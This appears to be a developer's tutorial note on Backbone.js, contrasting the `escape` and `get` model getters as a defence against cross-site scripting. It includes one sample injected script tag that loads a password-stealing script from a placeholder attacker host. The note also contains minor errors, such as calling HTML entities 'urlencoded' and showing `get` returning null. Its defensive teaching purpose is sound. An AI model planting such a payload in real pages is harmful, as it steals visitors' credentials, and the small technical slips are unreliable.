# `escape` and `get`

Backbone Models store attributes in an `attributes` hash attribute. In order to take advantage of the `listenTo` mechanism, we do not interact with the `attributes` hash attribute, but through getter and setter methods. The two getter methods are `get` and `escape`. 

## XSS
To set the stage to demonstrate the differences between `escape` and `get`, lets see the problem back drop.

[Cross-site Scripting][xss] attacks are a common attack where the attacker can submit malformed code in a form field that contains javascript or reference to client side scripts that will be run when the page is rendered.

Consider the situation where there is a form for a comment and the following is submitted:

`insensitive comment. <script src="http://evilserver.cn/password_stealer.js></script>`

When the comment is rendered on the page, it has the potential of being rendered as raw html and embedding the evil script tag onto the page, which will download *password_stealer.js to every client that visits the comment page.

Enter escape.

[xss]: http://en.wikipedia.org/wiki/Cross-site_scripting

## `escape`
Thanks to the beautifly documented backbone.js library, we can easily see that the `Backbone.Model#escape` method is calling the `_.escape` method. 

```js
// backbone escape
escape: function(attr) {
  return _.escape(this.get(attr));
},
```

To get a closer look at escape we can dive into the underscore.js source and see that _.escape takes a string and replaces all occurances of '&', '<', '>', '"', "'", and '/' with urlencoded versions. 

* **escape** always returns a *string*.

```js
// underscore escape
// keys will be replaced with values
var entityMap = {
  escape: {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  }
};

var entityRegexes = {
  escape:   new RegExp('[' + _.keys(entityMap.escape).join('') + ']', 'g'),
  unescape: new RegExp('(' + _.keys(entityMap.unescape).join('|') + ')', 'g')
};

_.each(['escape', 'unescape'], function(method) {
  _[method] = function(string) {
    if (string == null) return '';
    // return string after replacing all regular expression matches from the entityMap.
    return ('' + string).replace(entityRegexes[method], function(match) {
      return entityMap[method][match];
    });
  };
});
```

Okay, cool! If I've got a post model and I'm displaying it in a js template or on a page anywhere I'll use `escape`. Why is there even a `get` method?

Lets take a look...

## `get`
`Backbone.Model#get` is a simple getter that returns the value of the attribute from the `attributes` hash attribute.

* **get** always returns the unaltered attribute.

```js
get: function(attr) {
  return this.attributes[attr];
},
```

```js
var post = new Backbone.Model({});
console.log(post.get("title")); // null
console.log(post.escape("title")); // ""
```

Got it! If I need to use the raw, unaltered attribute for perhaps a calculation, or to check if the attribute is null, I'll use `get`. I'll default to using `escape`. Saftey First!

## Resources

* [escape and get - blog][metabates-blog]
    * **TODO** review this resource

[metabates-blog]: http://metabates.com/2012/04/17/there-is-no-escape-actually-there-is-and-you-should-always-use-it/